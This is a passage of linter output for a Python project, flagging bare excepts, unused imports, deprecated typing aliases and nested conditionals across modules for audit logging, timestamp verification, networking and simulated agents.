164 |                 json.dump({"metrics": self._metrics}, f)
165 |         except:
    |         ^^^^^^
166 |             pass
    |

E722 Do not use bare `except`
   --> src\app\domains\continuous_improvement.py:174:9
    |
172 |                 with open(state_file) as f:
173 |                     self._metrics = json.load(f).get("metrics", self._metrics)
174 |         except:
    |         ^^^^^^
175 |             pass
    |

E722 Do not use bare `except`
  --> src\app\domains\deep_expansion.py:79:9
   |
77 |             self._initialized = True
78 |             return True
79 |         except:
   |         ^^^^^^
80 |             return False
   |

E722 Do not use bare `except`
   --> src\app\domains\deep_expansion.py:166:9
    |
164 |                 self._metrics["scenarios_simulated"] += 1
165 |             return scenario
166 |         except:
    |         ^^^^^^
167 |             return None
    |

E722 Do not use bare `except`
   --> src\app\domains\deep_expansion.py:173:9
    |
171 |             with open(self.data_path / "state.json", "w") as f:
172 |                 json.dump({"metrics": self._metrics}, f)
173 |         except:
    |         ^^^^^^
174 |             pass
    |

E722 Do not use bare `except`
   --> src\app\domains\deep_expansion.py:182:9
    |
180 |                 with open(state_file) as f:
181 |                     self._metrics = json.load(f).get("metrics", self._metrics)
182 |         except:
    |         ^^^^^^
183 |             pass
    |

E722 Do not use bare `except`
  --> src\app\domains\ethics_governance.py:75:9
   |
73 |             self._initialized = True
74 |             return True
75 |         except:
   |         ^^^^^^
76 |             return False
   |

E722 Do not use bare `except`
   --> src\app\domains\ethics_governance.py:170:9
    |
168 |                 self._metrics["decisions_validated"] += 1
169 |             return decision
170 |         except:
    |         ^^^^^^
171 |             return None
    |

E722 Do not use bare `except`
   --> src\app\domains\ethics_governance.py:177:9
    |
175 |             with open(self.data_path / "state.json", "w") as f:
176 |                 json.dump({"metrics": self._metrics}, f)
177 |         except:
    |         ^^^^^^
178 |             pass
    |

E722 Do not use bare `except`
   --> src\app\domains\ethics_governance.py:186:9
    |
184 |                 with open(state_file) as f:
185 |                     self._metrics = json.load(f).get("metrics", self._metrics)
186 |         except:
    |         ^^^^^^
187 |             pass
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\domains\situational_awareness.py:366:9
    |
364 |           # In production, this would use ML models, computer vision, etc.
365 |
366 | /         if isinstance(data, dict):
367 | |             # Check for threat indicators
368 | |             if "movement_detected" in data and data.get("movement_detected"):
    | |_____________________________________________________________________________^
369 |                   threat_type = self._classify_threat_type(data)
370 |                   confidence = data.get("confidence", 0.5)
    |
help: Combine `if` statements using `and`

E722 Do not use bare `except`
   --> src\app\domains\supply_logistics.py:386:9
    |
384 |             with self._cache_lock:
385 |                 return self._availability_cache.get(rt, 0.0)
386 |         except:
    |         ^^^^^^
387 |             return 0.0
    |

E722 Do not use bare `except`
   --> src\app\domains\survivor_support.py:156:17
    |
154 |                 try:
155 |                     callback(data)
156 |                 except:
    |                 ^^^^^^
157 |                     pass
158 |             return len(subscribers)
    |

E722 Do not use bare `except`
   --> src\app\domains\survivor_support.py:176:9
    |
174 |                 self._metrics["survivors_registered"] += 1
175 |             return survivor
176 |         except:
    |         ^^^^^^
177 |             return None
    |

E722 Do not use bare `except`
   --> src\app\domains\survivor_support.py:183:9
    |
181 |             with open(self.data_path / "state.json", "w") as f:
182 |                 json.dump({"metrics": self._metrics}, f)
183 |         except:
    |         ^^^^^^
184 |             pass
    |

E722 Do not use bare `except`
   --> src\app\domains\survivor_support.py:193:9
    |
191 |                     state = json.load(f)
192 |                 self._metrics = state.get("metrics", self._metrics)
193 |         except:
    |         ^^^^^^
194 |             pass
    |

F401 `cryptography.hazmat.primitives.hashes` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\governance\acceptance_ledger.py:26:48
   |
25 | try:
26 |     from cryptography.hazmat.primitives import hashes, serialization
   |                                                ^^^^^^
27 |     from cryptography.hazmat.primitives.asymmetric import ed25519
28 |     from cryptography.hazmat.primitives.serialization import (
   |
help: Remove unused import

F401 `cryptography.hazmat.primitives.serialization` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\governance\acceptance_ledger.py:26:56
   |
25 | try:
26 |     from cryptography.hazmat.primitives import hashes, serialization
   |                                                        ^^^^^^^^^^^^^
27 |     from cryptography.hazmat.primitives.asymmetric import ed25519
28 |     from cryptography.hazmat.primitives.serialization import (
   |
help: Remove unused import

F841 Local variable `token_bytes` is assigned to but never used
   --> src\app\governance\acceptance_ledger.py:581:17
    |
579 |             # This is a placeholder for full verification logic
580 |             try:
581 |                 token_bytes = bytes.fromhex(entry.timestamp_authority)
    |                 ^^^^^^^^^^^
582 |                 # In a real verification, we'd fetch the certs from the token or config
583 |                 # and verify chain.
    |
help: Remove assignment to unused variable `token_bytes`

F401 `pyasn1.codec.der.encoder` imported but unused; consider using `importlib.util.find_spec` to test for availability
   --> src\app\governance\acceptance_ledger.py:613:43
    |
611 | try:
612 |     import rfc3161ng
613 |     from pyasn1.codec.der import decoder, encoder
    |                                           ^^^^^^^
614 |
615 |     TSA_AVAILABLE = True
    |
help: Remove unused import: `pyasn1.codec.der.encoder`

F841 Local variable `tst` is assigned to but never used
   --> src\app\governance\acceptance_ledger.py:645:9
    |
643 |             return False
644 |
645 |         tst = rfc3161ng.RemoteTimestamper(self.url, hashname="sha256")
    |         ^^^
646 |         try:
647 |             # Basic verification: check integrity and data match
    |
help: Remove assignment to unused variable `tst`

SIM103 Return the negated condition directly
   --> src\app\governance\acceptance_ledger.py:659:13
    |
657 |               tst_obj, _ = decoder.decode(token, asn1Spec=rfc3161ng.TimeStampResp())
658 |               status = tst_obj["status"]
659 | /             if status["status"] != 0:  # 0 = granted
660 | |                 return False
661 | |
662 | |             # Verify the hash in the token matches our data hash
663 | |             # This is a simplification. A real implementation needs full signature verification.
664 | |             # rfc3161ng provides tools for this but they expect specific setup.
665 | |             return True
    | |_______________________^
666 |           except Exception:
667 |               return False
    |
help: Inline condition

SIM117 Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> src\app\governance\audit_log.py:369:17
    |
367 |               # Copy and compress if needed
368 |               if self.compression:
369 | /                 with open(self.log_file, "rb") as f_in:
370 | |                     with gzip.open(archive_path, "wb") as f_out:
    | |________________________________________________________________^
371 |                           shutil.copyfileobj(f_in, f_out)
372 |               else:
    |
help: Combine `with` statements

F821 Undefined name `os`
   --> src\app\governance\audit_log.py:711:38
    |
709 |                 import redis as redis_module
710 |
711 |                 host = redis_host or os.environ.get("REDIS_HOST", "localhost")
    |                                      ^^
712 |                 password = redis_password or os.environ.get("REDIS_PASSWORD")
    |

F821 Undefined name `os`
   --> src\app\governance\audit_log.py:712:46
    |
711 |                 host = redis_host or os.environ.get("REDIS_HOST", "localhost")
712 |                 password = redis_password or os.environ.get("REDIS_PASSWORD")
    |                                              ^^
713 |
714 |                 self.redis_client = redis_module.Redis(
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\governance\audit_log.py:787:17
    |
785 |                       redis_success = self._write_to_redis(event_data)
786 |
787 | /                 elif self.sync_mode == "write_on_primary_failure":
788 | |                     # Only write to Redis if primary failed
789 | |                     if not primary_success:
    | |___________________________________________^
790 |                           redis_success = self._write_to_redis(event_data)
791 |                           logger.warning("Using Redis fallback due to primary failure")
    |
help: Combine `if` statements using `and`

SIM108 Use ternary operator `audit = AuditLogWithRedis() if redis_enabled else AuditLog()` instead of `if`-`else`-block
   --> src\app\governance\audit_log.py:903:5
    |
901 |       redis_enabled = os.environ.get("REDIS_HOST") is not None
902 |
903 | /     if redis_enabled:
904 | |         audit = AuditLogWithRedis()
905 | |     else:
906 | |         audit = AuditLog()
    | |__________________________^
907 |
908 |       audit.log_event(
    |
help: Replace `if`-`else`-block with `audit = AuditLogWithRedis() if redis_enabled else AuditLog()`

F401 [*] `time` imported but unused
  --> src\app\governance\audit_log_json.py:13:8
   |
11 | import logging
12 | import threading
13 | import time
   |        ^^^^
14 | from datetime import UTC, datetime
15 | from pathlib import Path
   |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\governance\audit_log_json.py:16:1
   |
14 | from datetime import UTC, datetime
15 | from pathlib import Path
16 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 |
18 | logger = logging.getLogger(__name__)
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\governance\audit_log_json.py:16:1
   |
14 | from datetime import UTC, datetime
15 | from pathlib import Path
16 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
17 |
18 | logger = logging.getLogger(__name__)
   |

F401 [*] `typing.Optional` imported but unused
  --> src\app\governance\audit_log_json.py:16:37
   |
14 | from datetime import UTC, datetime
15 | from pathlib import Path
16 | from typing import Any, Dict, List, Optional
   |                                     ^^^^^^^^
17 |
18 | logger = logging.getLogger(__name__)
   |
help: Remove unused import: `typing.Optional`

UP015 [*] Unnecessary mode argument
  --> src\app\governance\audit_log_json.py:66:38
   |
65 |         try:
66 |             with open(self.log_file, "r") as f:
   |                                      ^^^
67 |                 # Read last line
68 |                 lines = f.readlines()
   |
help: Remove mode argument

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\governance\audit_log_json.py:77:41
   |
75 |         return "GENESIS"
76 |
77 |     def _compute_hash(self, event_data: Dict[str, Any]) -> str:
   |                                         ^^^^
78 |         """Compute SHA-256 hash of event data."""
79 |         # Create canonical JSON representation
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\governance\audit_log_json.py:105:15
    |
103 |         self,
104 |         event_type: str,
105 |         data: Dict[str, Any] | None = None,
    |               ^^^^
106 |         actor: str = "system",
107 |         action: str = "",
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\governance\audit_log_json.py:111:19
    |
109 |         outcome: str = "success",
110 |         severity: str = "info",
111 |         metadata: Dict[str, Any] | None = None,
    |                   ^^^^
112 |         trace_id: str | None = None,
113 |         span_id: str | None = None,
    |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
   --> src\app\governance\audit_log_json.py:186:38
    |
185 |         try:
186 |             with open(self.log_file, "r") as f:
    |                                      ^^^
187 |                 lines = f.readlines()
    |
help: Remove mode argument

UP006 [*] Use `list` instead of `List` for type annotation
   --> src\app\governance\audit_log_json.py:228:10
    |
226 |         end_time: datetime | None = None,
227 |         limit: int | None = None,
228 |     ) -> List[Dict[str, Any]]:
    |          ^^^^
229 |         """
230 |         Query audit events with filters.
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\governance\audit_log_json.py:228:15
    |
226 |         end_time: datetime | None = None,
227 |         limit: int | None = None,
228 |     ) -> List[Dict[str, Any]]:
    |               ^^^^
229 |         """
230 |         Query audit events with filters.
    |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
   --> src\app\governance\audit_log_json.py:249:38
    |
248 |         try:
249 |             with open(self.log_file, "r") as f:
    |                                      ^^^
250 |                 for line in f:
251 |                     event = json.loads(line)
    |
help: Remove mode argument

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\governance\audit_log_json.py:281:33
    |
279 |         return results
280 |
281 |     def get_statistics(self) -> Dict[str, Any]:
    |                                 ^^^^
282 |         """Get audit log statistics."""
283 |         if not self.log_file.exists():
    |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
   --> src\app\governance\audit_log_json.py:287:38
    |
286 |         try:
287 |             with open(self.log_file, "r") as f:
    |                                      ^^^
288 |                 events = [json.loads(line) for line in f]
    |
help: Remove mode argument

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\external_merkle_anchor.py:309:17
    |
307 |             except Exception as e:
308 |                 logger.error("Failed to connect to IPFS: %s", e)
309 |                 raise RuntimeError(f"IPFS connection failed: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
310 |         return self._ipfs_client
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\external_merkle_anchor.py:351:13
    |
349 |         except Exception as e:
350 |             logger.error("IPFS pinning failed: %s", e)
351 |             raise RuntimeError(f"IPFS pinning error: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
352 |
353 |     def _verify_from_ipfs(
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\external_merkle_anchor.py:410:17
    |
408 |             except Exception as e:
409 |                 logger.error("Failed to connect to S3: %s", e)
410 |                 raise RuntimeError(f"S3 connection failed: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
411 |         return self._s3_client
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\external_merkle_anchor.py:483:13
    |
481 |                     self.s3_bucket,
482 |                 )
483 |             raise RuntimeError(f"S3 pinning error: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
484 |         except Exception as e:
485 |             logger.error("S3 pinning failed: %s", e)
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\external_merkle_anchor.py:486:13
    |
484 |         except Exception as e:
485 |             logger.error("S3 pinning failed: %s", e)
486 |             raise RuntimeError(f"S3 pinning error: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
487 |
488 |     def _verify_from_s3(
    |

F401 `app.governance.tsa_provider.TSAToken` imported but unused; consider using `importlib.util.find_spec` to test for availability
  --> src\app\governance\tsa_anchor_manager.py:61:58
   |
60 | try:
61 |     from app.governance.tsa_provider import TSAProvider, TSAToken
   |                                                          ^^^^^^^^
62 | except ImportError:
63 |     from src.app.governance.tsa_provider import TSAProvider
   |
help: Remove unused import: `app.governance.tsa_provider.TSAToken`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_anchor_manager.py:268:13
    |
266 |         except Exception as e:
267 |             logger.error("Failed to create anchor: %s", e)
268 |             raise AnchorChainError(f"Anchor creation failed: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
269 |
270 |     # ==============================
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_anchor_manager.py:323:21
    |
321 |                       )
322 |                   except Exception as e:
323 | /                     raise ChainIntegrityError(
324 | |                         f"Genesis signature verification failed at index {i}: {e}"
325 | |                     )
    | |_____________________^
326 |
327 |                   # CRITICAL: Verify TSA token
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_anchor_manager.py:332:21
    |
330 |                       token = self.tsa.verify_timestamp(tsa_token_der, payload_bytes)
331 |                   except Exception as e:
332 | /                     raise ChainIntegrityError(
333 | |                         f"TSA token verification failed at index {i}: {e}"
334 | |                     )
    | |_____________________^
335 |
336 |                   # CRITICAL: Enforce monotonic timestamps
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\governance\tsa_anchor_manager.py:337:17
    |
336 |                   # CRITICAL: Enforce monotonic timestamps
337 | /                 if previous_time is not None:
338 | |                     if token.tsa_time <= previous_time:
    | |_______________________________________________________^
339 |                           raise MonotonicViolationError(
340 |                               f"Non-monotonic timestamp detected at index {i}: "
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\governance\tsa_anchor_manager.py:348:17
    |
347 |                   # CRITICAL: Verify chain continuity
348 | /                 if i > 0:
349 | |                     if anchor.previous_anchor_hash != previous_payload_hash:
    | |____________________________________________________________________________^
350 |                           raise ChainIntegrityError(
351 |                               f"Broken chain at index {i}: "
    |
help: Combine `if` statements using `and`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_anchor_manager.py:370:17
    |
368 |             except Exception as e:
369 |                 logger.error("Unexpected error during verification: %s", e)
370 |                 raise ChainIntegrityError(f"Verification failed at index {i}: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
371 |
372 |         logger.info("Anchor chain verified successfully (%d anchors)", len(anchors))
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_anchor_manager.py:420:13
    |
418 |         except Exception as e:
419 |             logger.error("Failed to save anchor chain: %s", e)
420 |             raise AnchorChainError(f"Failed to save anchors: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
421 |
422 |     # ==============================
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_provider.py:214:13
    |
212 |             tsq_der = tsq.dump()
213 |         except Exception as e:
214 |             raise TSARequestError(f"Failed to encode TSA request: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
215 |
216 |         # Send HTTP POST with proper content type
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_provider.py:228:13
    |
226 |             response.raise_for_status()
227 |         except requests.RequestException as e:
228 |             raise TSARequestError(f"HTTP request failed: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
229 |
230 |         # Parse and verify response
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_provider.py:369:13
    |
368 |         except (ValueError, KeyError, AttributeError) as e:
369 |             raise TSAVerificationError(f"Failed to parse TSA response: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
370 |
371 |     def _verify_signature(
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> src\app\governance\tsa_provider.py:439:13
    |
437 |             if isinstance(e, TSAVerificationError):
438 |                 raise
439 |             raise TSAVerificationError(f"Signature verification failed: {e}")
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
440 |
441 |     # ==============================
    |

SIM116 Use a dictionary instead of consecutive `if` statements
   --> src\app\infrastructure\networking\spectrum_analyzer.py:235:9
    |
233 |       def _get_channel_data(self, band: str) -> dict[int, ChannelInfo]:
234 |           """Get channel data for band"""
235 | /         if band == "2.4ghz":
236 | |             return self.channel_data_2_4ghz
237 | |         elif band == "5ghz":
238 | |             return self.channel_data_5ghz
239 | |         elif band == "6ghz":
240 | |             return self.channel_data_6ghz
    | |_________________________________________^
241 |           return {}
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\infrastructure\networking\wifi_controller.py:316:21
    |
315 |                   for i, line in enumerate(lines):
316 | /                     if "Wi-Fi" in line:
317 | |                         # Next line typically has device name
318 | |                         if i + 1 < len(lines):
    | |______________________________________________^
319 |                               device_line = lines[i + 1]
320 |                               if "Device:" in device_line:
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\infrastructure\networking\wifi_controller.py:367:13
    |
366 |               # macOS typically supports WiFi 6 on newer devices
367 | /             if "WiFi 6" in result.stdout or "ax" in result.stdout:
368 | |                 if "6E" in result.stdout:
    | |_________________________________________^
369 |                       supported_bands.append(WiFiBand.BAND_6_GHZ)
370 |                       supported_standards.append(WiFiStandard.WIFI_6E)
    |
help: Combine `if` statements using `and`

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> src\app\inspection\cli.py:58:18
   |
56 |   @app.command()
57 |   def audit(
58 |       repo: Path = typer.Option(
   |  __________________^
59 | |         Path.cwd(),
60 | |         "--repo",
61 | |         "-r",
62 | |         help="Repository root directory",
63 | |         exists=True,
64 | |         file_okay=False,
65 | |         dir_okay=True,
66 | |         resolve_path=True,
67 | |     ),
   | |_____^
68 |       output: Path = typer.Option(
69 |           Path("audit_reports"),
   |

B008 Do not perform function call `Path.cwd` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> src\app\inspection\cli.py:59:9
   |
57 | def audit(
58 |     repo: Path = typer.Option(
59 |         Path.cwd(),
   |         ^^^^^^^^^^
60 |         "--repo",
61 |         "-r",
   |

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> src\app\inspection\cli.py:68:20
   |
66 |           resolve_path=True,
67 |       ),
68 |       output: Path = typer.Option(
   |  ____________________^
69 | |         Path("audit_reports"),
70 | |         "--output",
71 | |         "-o",
72 | |         help="Output directory for reports",
73 | |     ),
   | |_____^
74 |       config_file: Path | None = typer.Option(
75 |           None,
   |

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
  --> src\app\inspection\cli.py:74:32
   |
72 |           help="Output directory for reports",
73 |       ),
74 |       config_file: Path | None = typer.Option(
   |  ________________________________^
75 | |         None,
76 | |         "--config",
77 | |         "-c",
78 | |         help="Configuration file (YAML)",
79 | |         exists=True,
80 | |         file_okay=True,
81 | |         dir_okay=False,
82 | |     ),
   | |_____^
83 |       no_lint: bool = typer.Option(
84 |           False,
   |

B008 Do not perform function call `typer.Option` in argument defaults; instead, perform the call within the function, or read the default from a module-level singleton variable
   --> src\app\inspection\cli.py:204:20
    |
202 |           help="Create default configuration file",
203 |       ),
204 |       output: Path = typer.Option(
    |  ____________________^
205 | |         Path("inspection_config.yaml"),
206 | |         "--output",
207 | |         "-o",
208 | |         help="Output path for configuration file",
209 | |     ),
    | |_____^
210 |   ):
211 |       """
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\inspection\integrity_checker.py:188:25
    |
186 |                                   self.reverse_dependencies[alias.name].add(module_name)
187 |
188 | /                         elif isinstance(node, ast.ImportFrom):
189 | |                             if node.module:
    | |___________________________________________^
190 |                                   imported_names = [alias.name for alias in node.names]
191 |                                   dep = DependencyInfo(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\inspection\integrity_checker.py:335:13
    |
333 |               )
334 |
335 | /             if not is_entry_point:
336 | |                 # Check if it's in tests (tests are entry points)
337 | |                 if "test" not in module.lower():
    | |________________________________________________^
338 |                       self.issues.append(
339 |                           IntegrityIssue(
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\inspection\quality_analyzer.py:274:17
    |
273 |               for node in ast.walk(tree):
274 | /                 if isinstance(node, ast.FunctionDef):
275 | |                     # Check for return type or argument annotations
276 | |                     if node.returns or any(arg.annotation for arg in node.args.args):
    | |_____________________________________________________________________________________^
277 |                           return True
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\inspection\repository_inspector.py:498:9
    |
497 |           # If it's a config file with content, it's implemented
498 | /         if file_info.file_type in [FileType.CONFIG, FileType.YAML, FileType.JSON]:
499 | |             if file_info.lines_of_code > 0:
    | |___________________________________________^
500 |                   return FileStatus.IMPLEMENTED
    |
help: Combine `if` statements using `and`

F401 [*] `time` imported but unused
  --> src\app\miniature_office\agent_lounge.py:12:8
   |
11 | import logging
12 | import time
   |        ^^^^
13 | import uuid
14 | from dataclasses import dataclass, field
   |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\miniature_office\agents\agent.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> src\app\miniature_office\agents\agent.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP035 `typing.Set` is deprecated, use `set` instead
  --> src\app\miniature_office\agents\agent.py:10:1
   |
 8 | from datetime import datetime
 9 | from enum import Enum
10 | from typing import Any, Dict, List, Optional, Set
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
11 |
12 | from app.miniature_office.core.audit import EventType, get_audit_log
   |

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\agents\agent.py:40:16
   |
38 |     """
39 |
40 |     languages: Set[str] = field(default_factory=set)
   |                ^^^
41 |     tools: Set[str] = field(default_factory=set)
42 |     domains: Set[str] = field(default_factory=set)
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\agents\agent.py:41:12
   |
40 |     languages: Set[str] = field(default_factory=set)
41 |     tools: Set[str] = field(default_factory=set)
   |            ^^^
42 |     domains: Set[str] = field(default_factory=set)
43 |     skills: Set[str] = field(default_factory=set)
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\agents\agent.py:42:14
   |
40 |     languages: Set[str] = field(default_factory=set)
41 |     tools: Set[str] = field(default_factory=set)
42 |     domains: Set[str] = field(default_factory=set)
   |              ^^^
43 |     skills: Set[str] = field(default_factory=set)
44 |     security_clearance: int = 1  # 1-5 scale
   |
help: Replace with `set`

UP006 [*] Use `set` instead of `Set` for type annotation
  --> src\app\miniature_office\agents\agent.py:43:13
   |
41 |     tools: Set[str] = field(default_factory=set)
42 |     domains: Set[str] = field(default_factory=set)
43 |     skills: Set[str] = field(default_factory=set)
   |             ^^^
44 |     security_clearance: int = 1  # 1-5 scale
   |
help: Replace with `set`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\agents\agent.py:46:54
   |
44 |     security_clearance: int = 1  # 1-5 scale
45 |
46 |     def can_handle_task(self, required_capabilities: Dict[str, Any]) -> bool:
   |                                                      ^^^^
47 |         """Check if agent has required capabilities for a task"""
48 |         if "languages" in required_capabilities:
   |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> src\app\miniature_office\agents\agent.py:58:9
   |
56 |                   return False
57 |
58 | /         if "security_clearance" in required_capabilities:
59 | |             if self.security_clearance < required_capabilities["security_clearance"]:
   | |_____________________________________________________________________________________^
60 |                   return False
   |
help: Combine `if` statements using `and`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> src\app\miniature_office\agents\agent.py:64:26
   |
62 |         return True
63 |
64 |     def to_dict(self) -> Dict:
   |                          ^^^^
65 |         return {
66 |             "languages": list(self.languages),
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\agents\agent.py:85:24
   |
83 |         name: str,
84 |         role: AgentRole,
85 |         department_id: Optional[str] = None,
   |                        ^^^^^^^^^^^^^
86 |         capabilities: Optional[CapabilityProfile] = None,
87 |     ):
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\agents\agent.py:86:23
   |
84 |         role: AgentRole,
85 |         department_id: Optional[str] = None,
86 |         capabilities: Optional[CapabilityProfile] = None,
   |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 |     ):
88 |         super().__init__(agent_id, EntityType.AGENT, name)
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> src\app\miniature_office\agents\agent.py:92:31
   |
90 |         self.department_id = department_id
91 |         self.capabilities = capabilities or CapabilityProfile()
92 |         self.current_task_id: Optional[str] = None
   |                               ^^^^^^^^^^^^^
93 |         self.task_history: List[str] = []
94 |         self.status = "idle"  # idle, working, blocked, in_meeting
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> src\app\miniature_office\agents\agent.py:93:28
   |
91 |         self.capabilities = capabilities or CapabilityProfile()
92 |         self.current_task_id: Optional[str] = None
93 |         self.task_history: List[str] = []
   |                            ^^^^
94 |         self.status = "idle"  # idle, working, blocked, in_meeting
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:147:39
    |
146 |     def perform_action(
147 |         self, action: str, target_id: Optional[str] = None, data: Optional[Dict] = None
    |                                       ^^^^^^^^^^^^^
148 |     ):
149 |         """Perform a generic action and log it"""
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> src\app\miniature_office\agents\agent.py:147:67
    |
146 |     def perform_action(
147 |         self, action: str, target_id: Optional[str] = None, data: Optional[Dict] = None
    |                                                                   ^^^^^^^^^^^^^^
148 |     ):
149 |         """Perform a generic action and log it"""
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> src\app\miniature_office\agents\agent.py:147:76
    |
146 |     def perform_action(
147 |         self, action: str, target_id: Optional[str] = None, data: Optional[Dict] = None
    |                                                                            ^^^^
148 |     ):
